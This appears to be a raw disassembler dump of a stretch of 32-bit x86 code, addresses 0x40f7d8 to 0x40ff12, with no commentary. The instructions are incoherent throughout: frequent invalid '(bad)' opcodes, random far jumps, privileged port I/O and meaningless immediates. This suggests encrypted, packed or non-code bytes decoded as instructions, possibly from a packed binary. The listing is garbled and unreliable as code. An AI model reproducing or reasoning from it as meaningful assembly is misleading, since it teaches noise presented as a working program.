  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0xf66346f3
  40f7e3:	inc    edx
  40f7e4:	ja     0x40f845
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f80b
  40f7ee:	sbb    DWORD PTR [ebx+0x48ea677f],ecx
  40f7f4:	xchg   BYTE PTR [esi-0xfc24a5d],al
  40f7fa:	jnp    0x40f7b4
  40f7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7fd:	fbstp  TBYTE PTR [ebp-0x60ca8775]
  40f803:	pop    ebx
  40f804:	lock out 0x9a,al
  40f807:	pop    esi
  40f808:	lahf   
  40f809:	test   al,0x95
  40f80b:	fidiv  DWORD PTR [edx-0x5]
  40f80e:	push   es
  40f80f:	xor    bl,BYTE PTR [edx]
  40f811:	push   ebx
  40f812:	mov    esi,0x6b9616b9
  40f817:	push   ss
  40f818:	data16 (bad) 
  40f81a:	mov    ah,0x3e
  40f81c:	fisub  WORD PTR [ebx]
  40f81e:	xor    bh,BYTE PTR [esi-0x70afa41b]
  40f824:	xor    al,0x67
  40f826:	ins    BYTE PTR es:[edi],dx
  40f827:	repnz ins DWORD PTR es:[edi],dx
  40f829:	push   es
  40f82a:	in     al,0x88
  40f82c:	ror    BYTE PTR [edi+0x40d462ab],0xce
  40f833:	cmp    DWORD PTR [edx+0x7c],esi
  40f836:	pop    esp
  40f837:	shl    DWORD PTR [edx-0x42fd9d7c],0x9f
  40f83e:	in     al,0x63
  40f840:	jae    0x40f801
  40f842:	xor    esp,DWORD PTR [ecx+esi*2]
  40f845:	xchg   ebx,eax
  40f846:	out    0x2,eax
  40f848:	scas   al,BYTE PTR es:[edi]
  40f849:	add    cl,ah
  40f84b:	test   DWORD PTR [esp+ebp*1],ebx
  40f84e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f84f:	cwde   
  40f850:	mov    esp,0x6a947ae4
  40f855:	mov    eax,ebx
  40f857:	adc    al,0x5c
  40f859:	sbb    al,0x99
  40f85b:	cmp    al,0x5f
  40f85d:	push   0xffffff82
  40f85f:	mov    ah,bl
  40f861:	imul   edx,DWORD PTR [edx-0x66f51581],0xffffffe3
  40f868:	pop    es
  40f869:	fist   WORD PTR [edi+ebp*4-0xd]
  40f86d:	inc    ebx
  40f86e:	add    esi,esp
  40f870:	pop    ds
  40f871:	in     al,0x1b
  40f873:	test   eax,0xc1d8fd3f
  40f878:	shl    bl,1
  40f87a:	dec    esi
  40f87b:	fsub   DWORD PTR [ecx+0x436f9548]
  40f881:	mov    cl,0x1b
  40f883:	fld    DWORD PTR [ebx+0x5]
  40f886:	jne    0x40f8d8
  40f888:	push   eax
  40f889:	outs   dx,BYTE PTR ds:[esi]
  40f88a:	jbe    0x40f903
  40f88c:	inc    ebx
  40f88d:	(bad)  
  40f88e:	ror    dh,cl
  40f890:	mov    ch,0x7
  40f892:	sub    BYTE PTR [ebp+esi*2+0x3c6fd9d0],dh
  40f899:	jae    0x40f870
  40f89b:	jg     0x40f835
  40f89d:	xor    al,0x12
  40f89f:	popa   
  40f8a0:	push   cs
  40f8a1:	sahf   
  40f8a2:	(bad)  
  40f8a3:	push   es
  40f8a4:	sub    al,0x1c
  40f8a6:	mov    ecx,?
  40f8a8:	cmp    DWORD PTR [ecx-0x444bfc26],0x50f4f39f
  40f8b2:	and    DWORD PTR [edi-0x10],0x3b2f98e1
  40f8b9:	add    al,0x3
  40f8bb:	xor    DWORD PTR [esi],ecx
  40f8bd:	push   eax
  40f8be:	push   ss
  40f8bf:	arpl   WORD PTR [esi],cx
  40f8c1:	mov    eax,ds:0x9f47718f
  40f8c6:	mov    edi,DWORD PTR [esi]
  40f8c8:	cmp    al,0x51
  40f8ca:	lods   eax,DWORD PTR ds:[esi]
  40f8cb:	inc    ebx
  40f8cc:	adc    ah,BYTE PTR [edi+0x468a36e6]
  40f8d2:	rcl    DWORD PTR [ebx],cl
  40f8d4:	aam    0x7f
  40f8d6:	stc    
  40f8d7:	mov    ch,0xe
  40f8d9:	leave  
  40f8da:	push   0xe88bd344
  40f8df:	hlt    
  40f8e0:	inc    ebp
  40f8e1:	inc    edx
  40f8e2:	xchg   BYTE PTR [eax+0x344ef151],ah
  40f8e8:	aad    0xe4
  40f8ea:	sahf   
  40f8eb:	lods   eax,DWORD PTR ds:[esi]
  40f8ec:	popa   
  40f8ed:	leave  
  40f8ee:	jmp    0x40f96f
  40f8f0:	inc    ecx
  40f8f1:	sub    BYTE PTR [eax+0x49],ch
  40f8f4:	lahf   
  40f8f5:	add    al,0x5c
  40f8f7:	xor    al,0xb3
  40f8f9:	sub    BYTE PTR [eax+0x24702d36],bh
  40f8ff:	hlt    
  40f900:	out    0xe0,eax
  40f902:	add    eax,0x858af140
  40f907:	add    cl,bl
  40f909:	sbb    al,0x35
  40f90b:	inc    ecx
  40f90c:	data16 sahf 
  40f90e:	dec    eax
  40f90f:	daa    
  40f910:	xchg   DWORD PTR [eax],ecx
  40f912:	or     dl,BYTE PTR [edi-0x75]
  40f915:	nop
  40f916:	cmp    cl,bl
  40f918:	inc    eax
  40f919:	dec    ecx
  40f91a:	(bad)  
  40f91b:	xchg   edx,eax
  40f91c:	sbb    ebp,0x33a73e4a
  40f922:	popa   
  40f923:	mov    dh,0x36
  40f925:	call   edx
  40f927:	imul   edi,DWORD PTR [ecx],0x1f
  40f92a:	xchg   esi,eax
  40f92b:	loope  0x40f93e
  40f92d:	shr    bh,1
  40f92f:	test   DWORD PTR [ebx*1+0x6ef6fc88],edi
  40f936:	(bad)  
  40f937:	imul   edx,DWORD PTR [edi+ecx*2],0x4d
  40f93b:	push   edi
  40f93c:	inc    ebp
  40f93d:	cmp    BYTE PTR [ebx],dh
  40f93f:	push   ebp
  40f940:	dec    ebp
  40f941:	lods   eax,DWORD PTR ds:[esi]
  40f942:	xchg   BYTE PTR ss:[edx+edi*2-0x72077684],bh
  40f94a:	out    0x19,al
  40f94c:	shl    edi,0x28
  40f94f:	setg   BYTE PTR [edx-0x43c0c2e3]
  40f956:	inc    edi
  40f957:	jg     0x40f8e8
  40f959:	or     BYTE PTR [ecx-0x11c1f4ab],0x2f
  40f960:	lods   eax,DWORD PTR ds:[esi]
  40f961:	cmp    bl,BYTE PTR [esi]
  40f963:	push   esi
  40f964:	gs leave 
  40f966:	(bad)  
  40f968:	outs   dx,BYTE PTR ds:[esi]
  40f969:	push   esi
  40f96a:	pushf  
  40f96b:	mov    dh,0x67
  40f96d:	xor    BYTE PTR [esi-0x2c227e31],bl
  40f973:	xchg   ebx,eax
  40f974:	mov    ebp,0x91fb500a
  40f979:	dec    esi
  40f97a:	jne    0x40f9f2
  40f97c:	inc    edi
  40f97d:	lods   al,BYTE PTR ds:[esi]
  40f97e:	fisubr DWORD PTR [edx-0x2e171892]
  40f984:	loopne 0x40f97b
  40f986:	inc    edi
  40f987:	jmp    0x40f9c6
  40f989:	ss xchg edi,eax
  40f98b:	or     esi,ebx
  40f98d:	mov    gs,edx
  40f98f:	mov    ss,WORD PTR [esi]
  40f991:	inc    esp
  40f992:	push   ecx
  40f993:	ins    BYTE PTR es:[edi],dx
  40f994:	inc    ecx
  40f996:	xchg   DWORD PTR [edi+0x3d],esp
  40f999:	lods   al,BYTE PTR cs:[esi]
  40f99b:	cmp    dl,bh
  40f99d:	xchg   ebp,eax
  40f99e:	mov    dh,0xfd
  40f9a0:	mov    dl,0x62
  40f9a2:	les    edx,FWORD PTR [eax-0x6d]
  40f9a5:	fstp   QWORD PTR [edx+0x3c]
  40f9a8:	lods   al,BYTE PTR ds:[esi]
  40f9a9:	push   ebp
  40f9aa:	arpl   WORD PTR [ebp+0x42ec8e3],dx
  40f9b0:	retf   0x207c
  40f9b3:	rsqrtps xmm3,xmm5
  40f9b6:	dec    esi
  40f9b7:	cwd    
  40f9b9:	fist   DWORD PTR [edi-0x32]
  40f9bc:	jp     0x40f9e7
  40f9be:	sub    DWORD PTR [edi+edi*4],0x945cb17d
  40f9c5:	test   BYTE PTR [eax-0x1c],dl
  40f9c8:	rol    DWORD PTR [esi+0x0],0xb8
  40f9cc:	and    al,0x8c
  40f9ce:	popa   
  40f9cf:	leave  
  40f9d0:	sub    al,0xd8
  40f9d2:	pushf  
  40f9d3:	and    edx,DWORD PTR [esi+0x74]
  40f9d6:	sub    dh,dl
  40f9d8:	lods   eax,DWORD PTR ds:[esi]
  40f9d9:	es nop
  40f9db:	inc    edx
  40f9dc:	fcomp  QWORD PTR [eax-0x12]
  40f9df:	jae    0x40fa5f
  40f9e1:	push   0xffffffe2
  40f9e3:	out    0xf,al
  40f9e5:	mov    ?,WORD PTR [ecx-0x30]
  40f9e8:	leave  
  40f9e9:	push   ss
  40f9ea:	or     BYTE PTR [eax+0x4c],cl
  40f9ed:	fnstsw WORD PTR [ecx-0x7af68888]
  40f9f3:	sbb    eax,esi
  40f9f5:	int    0x9b
  40f9f7:	pop    eax
  40f9f8:	icebp  
  40f9f9:	out    dx,al
  40f9fa:	jnp    0x40fa13
  40f9fc:	fwait
  40f9fd:	mov    esi,0x91011128
  40fa02:	adc    ch,dh
  40fa04:	sbb    al,0xbe
  40fa06:	xchg   ebp,eax
  40fa07:	or     edi,ecx
  40fa09:	dec    edx
  40fa0a:	pop    eax
  40fa0b:	jecxz  0x40fa3b
  40fa0d:	fidivr WORD PTR [edi+eiz*4+0x3660f7b7]
  40fa14:	fild   QWORD PTR [eax]
  40fa16:	(bad)  
  40fa17:	jmp    0x1533d9c2
  40fa1c:	xchg   ebx,eax
  40fa1d:	and    eax,0xe5563fbc
  40fa22:	sub    BYTE PTR [edx-0x2e],0xd6
  40fa26:	sbb    al,0x8d
  40fa28:	leave  
  40fa29:	sbb    DWORD PTR [eax+0x49d50142],esi
  40fa2f:	and    al,0x35
  40fa31:	jmp    0x40fa6c
  40fa33:	retf   0x4ac2
  40fa36:	les    ecx,FWORD PTR [edi-0x36]
  40fa39:	sar    BYTE PTR [ebp-0x43],1
  40fa3c:	pushf  
  40fa3d:	xor    esp,DWORD PTR [eax+0x16]
  40fa40:	add    eax,DWORD PTR ds:0x780f2ad5
  40fa46:	mov    cl,0x54
  40fa48:	ret    
  40fa49:	neg    DWORD PTR [ecx-0x107cf0fa]
  40fa4f:	pop    esi
  40fa50:	adc    al,0xbb
  40fa52:	and    BYTE PTR [ebp+0x3b],ch
  40fa55:	in     eax,dx
  40fa56:	lock mov ecx,?
  40fa59:	push   es
  40fa5a:	or     eax,eax
  40fa5c:	arpl   bp,bp
  40fa5e:	push   edi
  40fa5f:	add    eax,0x1e46503f
  40fa64:	sti    
  40fa65:	mov    dl,0x96
  40fa67:	sbb    BYTE PTR [ebp+0x74],al
  40fa6a:	test   DWORD PTR [ebx-0x4d],eax
  40fa6d:	xchg   edi,eax
  40fa6e:	push   0x7feec729
  40fa73:	in     al,dx
  40fa74:	sub    bh,0x69
  40fa77:	(bad)  [edx+0x7d]
  40fa7a:	adc    DWORD PTR [eax-0x3a],edx
  40fa7d:	sbb    ah,BYTE PTR [edx]
  40fa7f:	jg     0x40fab7
  40fa81:	pop    ss
  40fa82:	cmp    al,0x44
  40fa84:	jo     0x40fa8e
  40fa86:	ja     0x40fb00
  40fa88:	cdq    
  40fa89:	jo     0x40fa58
  40fa8b:	dec    esp
  40fa8c:	xchg   ebx,eax
  40fa8d:	mov    esi,0x4315e05
  40fa92:	(bad)  
  40fa93:	dec    esp
  40fa94:	es add al,0x44
  40fa97:	fisubr DWORD PTR [esi-0xca0a09d]
  40fa9d:	aaa    
  40fa9e:	icebp  
  40fa9f:	cmp    eax,0x1cfac9dd
  40faa4:	shr    DWORD PTR [ecx],1
  40faa6:	mov    ebp,0x4c0a0866
  40faab:	or     eax,0xf8760771
  40fab0:	imul   edi,edi,0xfffffffc
  40fab3:	pop    eax
  40fab4:	enter  0x412f,0xb7
  40fab8:	cmp    al,BYTE PTR [ecx]
  40faba:	push   edx
  40fabb:	cmp    ch,BYTE PTR [edx-0xa2d3ad2]
  40fac1:	sti    
  40fac2:	adc    bh,bl
  40fac4:	dec    esi
  40fac5:	jecxz  0x40fb26
  40fac7:	int3   
  40fac8:	std    
  40fac9:	push   DWORD PTR [ebp+0x51]
  40facc:	sub    eax,0x412a0825
  40fad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad2:	loop   0x40fae7
  40fad4:	xor    dl,BYTE PTR [ebx+0x26]
  40fad7:	mov    esi,0xf9c4a3d4
  40fadc:	add    DWORD PTR [eax+0x4d],eax
  40fadf:	sbb    BYTE PTR [edx],al
  40fae1:	xchg   edi,eax
  40fae2:	ret    0x915a
  40fae5:	fwait
  40fae6:	popf   
  40fae7:	test   eax,0xa15e05ee
  40faec:	cwde   
  40faed:	pop    ebx
  40faee:	mov    esp,esp
  40faf0:	bound  edx,QWORD PTR [edx-0x5c]
  40faf3:	js     0x40fa9d
  40faf5:	arpl   WORD PTR [esi-0x5d28d62e],bx
  40fafb:	jmp    0xff5ba1b4
  40fb00:	(bad)  
  40fb01:	leave  
  40fb02:	jmp    0x98935487
  40fb07:	sbb    eax,0xd22c7da7
  40fb0c:	dec    esp
  40fb0d:	aam    0xc3
  40fb0f:	xor    DWORD PTR [eax-0x32],0x2a
  40fb13:	nop
  40fb14:	mov    bh,0xb6
  40fb16:	mov    cl,0x20
  40fb18:	adc    DWORD PTR [ecx+0x6d],0x5b767f7d
  40fb1f:	fist   WORD PTR [eax-0x3e]
  40fb22:	or     DWORD PTR [ebx+0x7c1527c2],ebp
  40fb28:	retf   0x4a31
  40fb2b:	test   DWORD PTR [edx+0x20550a13],edi
  40fb31:	or     edx,ecx
  40fb33:	mov    eax,0xd14c41af
  40fb38:	cmc    
  40fb39:	mov    edi,0x4ab7602f
  40fb3e:	out    dx,eax
  40fb3f:	shr    BYTE PTR [esi+ecx*1+0x67],cl
  40fb43:	imul   ebp,DWORD PTR [ebx],0x4bd045e
  40fb49:	scas   al,BYTE PTR es:[edi]
  40fb4a:	adc    al,BYTE PTR [esp+esi*8-0x76856443]
  40fb51:	jns    0x40fb03
  40fb53:	xchg   esp,eax
  40fb54:	jbe    0x40fba8
  40fb56:	fs shl dl,cl
  40fb59:	mov    edx,0x586c0e5e
  40fb5e:	loopne 0x40faf8
  40fb60:	sub    DWORD PTR [edi+0x68],edx
  40fb63:	jg     0x40fb83
  40fb65:	repz sbb bl,BYTE PTR [edi+0x54468103]
  40fb6c:	call   0x7be44787
  40fb71:	or     al,BYTE PTR [ebx]
  40fb73:	imul   ecx,DWORD PTR [ecx+eiz*1-0x74],0x59
  40fb78:	dec    esp
  40fb79:	imul   esp,DWORD PTR [ebp+0x2],0x50
  40fb7d:	(bad)  
  40fb7e:	add    DWORD PTR [esi+0x0],eax
  40fb81:	mov    dh,0x1b
  40fb83:	or     esp,ebp
  40fb85:	mov    ecx,edi
  40fb87:	rol    esi,1
  40fb89:	test   al,0x78
  40fb8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb8c:	xor    edx,DWORD PTR [ecx]
  40fb8e:	push   ebp
  40fb8f:	leave  
  40fb90:	jge    0x40fbe7
  40fb92:	fscale 
  40fb94:	jmp    0x40fba0
  40fb96:	iret   
  40fb97:	pop    ecx
  40fb98:	sub    BYTE PTR [eax],bl
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x40
  40fbb3:	stc    
  40fbb4:	dec    ecx
  40fbb5:	loop   0x40fb39
  40fbb7:	mov    cl,0x70
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fb5d
  40fbbf:	scas   eax,DWORD PTR es:[edi]
  40fbc0:	adc    ch,BYTE PTR [esi+0x56]
  40fbc3:	fisubr DWORD PTR [ebx]
  40fbc5:	jb     0x40fb89
  40fbc7:	bound  edi,QWORD PTR [edx-0x59]
  40fbca:	jmp    0x768a:0x46cf91ac
  40fbd1:	add    BYTE PTR [edi-0x42539bab],0x1b
  40fbd8:	mov    ds:0x5b330a5e,al
  40fbdd:	lods   eax,DWORD PTR ds:[esi]
  40fbde:	inc    edx
  40fbdf:	jmp    0xff1b:0x3a02da94
  40fbe6:	jecxz  0x40fbcc
  40fbe8:	retf   
  40fbe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbea:	sub    DWORD PTR [esi+0x45],ebp
  40fbed:	popa   
  40fbee:	mov    WORD PTR [eax+0x19],ss
  40fbf1:	imul   DWORD PTR [ecx-0x3c]
  40fbf4:	cli    
  40fbf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf6:	pop    ebx
  40fbf7:	mov    al,ds:0x2be15fdb
  40fbfc:	iret   
  40fbfd:	dec    esp
  40fbfe:	lahf   
  40fbff:	push   ds
  40fc00:	adc    eax,0x29c35db
  40fc05:	aam    0xfb
  40fc07:	aam    0x7c
  40fc09:	push   ecx
  40fc0a:	jae    0x40fb8f
  40fc0c:	mov    BYTE PTR es:[eax],cl
  40fc0f:	int3   
  40fc10:	mov    eax,0xeb6e7bf2
  40fc15:	dec    edx
  40fc16:	xchg   edx,eax
  40fc17:	popf   
  40fc18:	push   edi
  40fc19:	dec    eax
  40fc1a:	inc    esp
  40fc1b:	pushf  
  40fc1c:	call   0x17c655b6
  40fc21:	pop    edi
  40fc22:	add    esi,DWORD PTR [eax]
  40fc24:	jge    0x40fc87
  40fc26:	xchg   ah,bh
  40fc28:	xor    eax,DWORD PTR [ebx-0x9]
  40fc2b:	aad    0x65
  40fc2d:	adc    esi,ebx
  40fc2f:	(bad)  
  40fc30:	call   DWORD PTR [ebx+0x7b]
  40fc33:	mov    DWORD PTR [ecx-0x63],edx
  40fc36:	stc    
  40fc37:	test   al,0x6b
  40fc39:	pop    ebp
  40fc3a:	cmp    ch,BYTE PTR [eax-0xb]
  40fc3d:	in     eax,dx
  40fc3e:	dec    esp
  40fc3f:	add    DWORD PTR [ecx],esi
  40fc41:	mov    bh,0x45
  40fc43:	mov    dl,0x69
  40fc45:	aad    0xed
  40fc47:	jge    0x40fc3d
  40fc49:	clc    
  40fc4a:	stos   DWORD PTR es:[edi],eax
  40fc4b:	mov    eax,0xeea97642
  40fc50:	sub    eax,0x7cb5a14a
  40fc55:	or     eax,DWORD PTR [ebx+ebx*2]
  40fc58:	mov    eax,ds:0xf98a57f3
  40fc5d:	retf   
  40fc5e:	or     eax,0xefe67580
  40fc63:	popa   
  40fc64:	scas   al,BYTE PTR es:[edi]
  40fc65:	add    DWORD PTR [edi-0x57d97976],esi
  40fc6b:	or     bl,BYTE PTR [ebx]
  40fc6d:	(bad)  [edx+0x6766fce0]
  40fc73:	addr16 das 
  40fc75:	jle    0x40fc5d
  40fc77:	retf   0x436f
  40fc7a:	(bad)  
  40fc7b:	in     al,dx
  40fc7c:	arpl   dx,di
  40fc7e:	sbb    eax,DWORD PTR [eax+0x5e3601a2]
  40fc84:	(bad)  
  40fc85:	fidiv  WORD PTR [esi]
  40fc87:	pushf  
  40fc88:	xchg   DWORD PTR [eax],ecx
  40fc8a:	xchg   DWORD PTR [eax+eax*4-0x11b452f8],esi
  40fc91:	jne    0x40fcee
  40fc93:	std    
  40fc94:	jp     0x40fd09
  40fc96:	inc    ecx
  40fc97:	mov    cl,0x43
  40fc99:	xchg   BYTE PTR [ecx-0x499b00b4],cl
  40fc9f:	xor    al,0x26
  40fca1:	mov    dh,0x97
  40fca3:	sbb    edx,0xffffffba
  40fca6:	(bad)  
  40fca8:	(bad)  
  40fca9:	mov    ds:0xada86d3a,eax
  40fcae:	mov    bh,BYTE PTR [eax-0x48]
  40fcb1:	mov    dl,0x45
  40fcb3:	jmp    0x459:0x46b40892
  40fcba:	retf   0xa071
  40fcbd:	mov    DWORD PTR [ebp+eiz*8-0x5d],edi
  40fcc1:	push   es
  40fcc2:	adc    al,BYTE PTR [esi-0x5bc924fc]
  40fcc8:	popf   
  40fcc9:	mov    ds:0x3bb1d4c5,al
  40fcce:	xor    al,0x1
  40fcd0:	push   edx
  40fcd1:	push   0xe0edccba
  40fcd6:	add    cl,BYTE PTR [edx+edi*1-0x49]
  40fcda:	or     al,0xa2
  40fcdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcdd:	mov    eax,ds:0xdd82c878
  40fce2:	out    0x66,eax
  40fce4:	fisub  DWORD PTR [esi]
  40fce6:	stos   BYTE PTR es:[edi],al
  40fce7:	pop    esp
  40fce8:	sub    DWORD PTR ds:0x900e2b4,edi
  40fcee:	sbb    al,0xcf
  40fcf0:	xchg   ebp,eax
  40fcf1:	les    ebp,FWORD PTR [esi]
  40fcf3:	sahf   
  40fcf4:	lea    ebx,[ecx+0x1]
  40fcf7:	dec    esp
  40fcf8:	mov    WORD PTR [ebx],gs
  40fcfa:	adc    DWORD PTR [esi],0xffffffe8
  40fcfd:	test   BYTE PTR [esi+0x295fef7],bl
  40fd03:	mov    ah,BYTE PTR [eax+eax*2-0x523043b9]
  40fd0a:	mov    ds:0x3cfbd7a0,eax
  40fd0f:	xchg   esp,eax
  40fd10:	loopne 0x40fd5a
  40fd12:	leave  
  40fd13:	mov    al,ds:0x5b49ced4
  40fd18:	je     0x40fd83
  40fd1a:	(bad)  
  40fd1b:	fdiv   DWORD PTR [ecx+0x0]
  40fd1e:	mov    al,ds:0x806a5c49
  40fd23:	jbe    0x40fcf8
  40fd25:	lock mov ds:0xbac7ea7f,eax
  40fd2b:	push   edx
  40fd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd2d:	popa   
  40fd2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd2f:	mov    edi,0xc1d03263
  40fd34:	dec    eax
  40fd35:	or     eax,0x4532122a
  40fd3a:	inc    ecx
  40fd3b:	cmp    bh,BYTE PTR [ebp+edx*2+0x5429c5e7]
  40fd42:	stos   BYTE PTR es:[edi],al
  40fd43:	lods   al,BYTE PTR ds:[esi]
  40fd44:	xchg   BYTE PTR [edx],bh
  40fd46:	and    bl,bl
  40fd48:	loope  0x40fd98
  40fd4a:	mov    ds:0x30e9c8f7,eax
  40fd4f:	xor    DWORD PTR [ecx+0x35],edi
  40fd52:	push   edi
  40fd53:	out    0xba,al
  40fd55:	out    dx,al
  40fd56:	ret    
  40fd57:	sbb    ebx,edx
  40fd59:	in     eax,dx
  40fd5a:	into   
  40fd5b:	inc    esp
  40fd5c:	stos   DWORD PTR es:[edi],eax
  40fd5d:	mov    dl,0xe6
  40fd5f:	fadd   st(5),st
  40fd61:	in     al,dx
  40fd62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd63:	aad    0x73
  40fd65:	lock sbb al,0xf4
  40fd68:	pop    ss
  40fd69:	inc    eax
  40fd6a:	adc    eax,0xd8f038f8
  40fd6f:	iret   
  40fd70:	or     eax,0x77582ab6
  40fd75:	and    BYTE PTR [edx+esi*2+0x52],0x6d
  40fd7a:	xchg   esi,eax
  40fd7b:	jge    0x40fcfd
  40fd7d:	out    dx,eax
  40fd7e:	push   ebp
  40fd7f:	mov    dl,0x6f
  40fd81:	enter  0x3254,0x55
  40fd85:	mov    ebp,0xc29ac4ef
  40fd8a:	shr    DWORD PTR [ebp+0x5f],1
  40fd8d:	dec    esp
  40fd8e:	mov    ds:0xe7f9c682,eax
  40fd93:	push   ds
  40fd94:	or     ecx,DWORD PTR [edx]
  40fd96:	fadd   st,st(5)
  40fd98:	jmp    0x6fdbded4
  40fd9d:	stos   BYTE PTR es:[edi],al
  40fd9e:	mov    dl,0x8e
  40fda0:	xor    DWORD PTR [ecx+0x57],ebp
  40fda3:	ficomp DWORD PTR [eax-0x2877d5c6]
  40fda9:	into   
  40fdaa:	aam    0xb7
  40fdac:	dec    edi
  40fdad:	push   es
  40fdae:	sti    
  40fdaf:	mov    ecx,0x94fcd267
  40fdb4:	jl     0x40fdc0
  40fdb6:	cwde   
  40fdb7:	push   0xffffffff
  40fdb9:	pusha  
  40fdba:	mov    al,ds:0xacf66f67
  40fdbf:	jecxz  0x40fdc8
  40fdc1:	test   al,0x2f
  40fdc3:	out    0x32,al
  40fdc5:	pop    ss
  40fdc6:	mul    DWORD PTR [edx+0x64]
  40fdc9:	pop    DWORD PTR [ebp-0x2e]
  40fdcc:	or     al,0x9f
  40fdce:	xchg   ebx,eax
  40fdcf:	adc    DWORD PTR [ecx+0x300dd8ee],edx
  40fdd5:	or     DWORD PTR [si-0x3e93],edi
  40fdda:	cmp    BYTE PTR [ebx-0x4492bc0d],bh
  40fde0:	pusha  
  40fde1:	leave  
  40fde2:	jae    0x40fde6
  40fde4:	and    ecx,DWORD PTR [ecx]
  40fde6:	ss cwd 
  40fde9:	add    ebp,DWORD PTR [eax-0xc17fb8a]
  40fdef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdf0:	js     0x40fd83
  40fdf2:	xor    al,0xb
  40fdf4:	outs   dx,BYTE PTR ds:[esi]
  40fdf5:	inc    esp
  40fdf6:	fstp   QWORD PTR [ebx+0xd15c933]
  40fdfc:	sbb    eax,0x2cde43ec
  40fe01:	jmp    0x40fe15
  40fe03:	pop    eax
  40fe04:	ins    DWORD PTR es:[edi],dx
  40fe05:	xor    al,0xa6
  40fe07:	leave  
  40fe08:	loope  0x40fe4e
  40fe0a:	loope  0x40fdcb
  40fe0c:	pushf  
  40fe0d:	mov    bl,ch
  40fe0f:	pop    esp
  40fe10:	lds    esi,FWORD PTR ds:0xf76b90ab
  40fe16:	or     al,0x2c
  40fe18:	call   0xf14:0xf812a054
  40fe1f:	jnp    0x40fe7b
  40fe21:	xor    esi,ebx
  40fe23:	mov    ebp,0x9ba73daf
  40fe28:	lock xchg DWORD PTR [edi],esi
  40fe2b:	mov    ah,0x68
  40fe2d:	cmp    cl,ah
  40fe2f:	mov    es,WORD PTR [esi]
  40fe31:	xor    eax,0xa0091460
  40fe36:	ret    0xe258
  40fe39:	shl    BYTE PTR [ebp-0x3b25f010],1
  40fe3f:	aas    
  40fe40:	mov    esp,0x95f4f05d
  40fe45:	and    BYTE PTR [ebx-0x6],dh
  40fe48:	jmp    0xf5f8:0xa6a4e55a
  40fe4f:	push   0xa67d1dce
  40fe54:	sbb    cl,BYTE PTR [edi+0x24]
  40fe57:	ss aam 0xa9
  40fe5a:	aam    0xb
  40fe5c:	mov    ds:0xa76ffb44,al
  40fe61:	out    dx,eax
  40fe62:	mov    ch,0x79
  40fe64:	dec    esi
  40fe66:	mov    esi,0xefbc816
  40fe6b:	inc    esp
  40fe6c:	xor    al,0x3c
  40fe6e:	aam    0xb9
  40fe70:	sbb    cl,BYTE PTR [edx]
  40fe72:	cmp    eax,0xe544f4c1
  40fe77:	fild   DWORD PTR [eax]
  40fe79:	add    DWORD PTR [ecx-0x59],0x7b
  40fe7d:	ja     0x40fea3
  40fe7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe80:	mov    DWORD PTR [edx+eax*8],ebx
  40fe83:	nop
  40fe84:	popf   
  40fe85:	fisttp QWORD PTR [esi-0x2a]
  40fe88:	scas   al,BYTE PTR es:[edi]
  40fe89:	pop    edi
  40fe8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe8b:	sub    eax,0xa3d8fcf0
  40fe90:	pop    ecx
  40fe91:	pop    eax
  40fe92:	jl     0x40feec
  40fe94:	sbb    BYTE PTR [ecx],0xe6
  40fe97:	adc    al,0xc
  40fe99:	sti    
  40fe9a:	jp     0x40fe1d
  40fe9c:	pushf  
  40fe9d:	(bad)  
  40fe9e:	mov    ah,0x47
  40fea0:	retf   
  40fea1:	push   esp
  40fea2:	idiv   BYTE PTR [esi-0x48448870]
  40fea8:	add    edx,DWORD PTR [esi-0x61948c6c]
  40feae:	lods   eax,DWORD PTR ds:[esi]
  40feaf:	jmp    0x40fee1
  40feb1:	and    eax,0x45ea6ae5
  40feb6:	and    al,0x7f
  40feb8:	dec    ecx
  40feb9:	xchg   ebx,eax
  40feba:	into   
  40febb:	xor    eax,0x9ef7491d
  40fec0:	scas   eax,DWORD PTR es:[edi]
  40fec1:	cmp    eax,0xe25bd9cb
  40fec6:	retf   0x2be7
  40fec9:	or     cl,BYTE PTR [ebp+0x53]
  40fecc:	in     eax,0xb3
  40fece:	mov    dh,0x8b
  40fed0:	add    eax,0xe02dbf4e
  40fed5:	jbe    0x40fe6a
  40fed7:	and    al,BYTE PTR [edi+0x73]
  40feda:	xchg   esi,eax
  40fedb:	xchg   esi,eax
  40fedc:	dec    ecx
  40fedd:	and    ebx,DWORD PTR [ebx+0x24]
  40fee0:	sti    
  40fee1:	and    eax,0x3bea646f
  40fee6:	jo     0x40ff19
  40fee8:	repz aaa 
  40feea:	outs   dx,BYTE PTR ds:[esi]
  40feeb:	addr16 mov ebx,0xae79fa83
  40fef1:	cdq    
  40fef2:	stc    
  40fef3:	or     DWORD PTR [esi-0x6e],eax
  40fef6:	int3   
  40fef7:	add    BYTE PTR [esi-0xe],dh
  40fefa:	int3   
  40fefb:	mov    esp,0x750b93bc
  40ff00:	mov    ecx,0x597db0e7
  40ff05:	fwait
  40ff06:	add    BYTE PTR [ebx-0xf37d307],0x7a
  40ff0d:	xchg   esp,eax
  40ff0e:	cmc    
  40ff0f:	sbb    DWORD PTR [ecx-0x68],eax
  40ff12:	outs   dx,BYTE PTR ds:[esi]
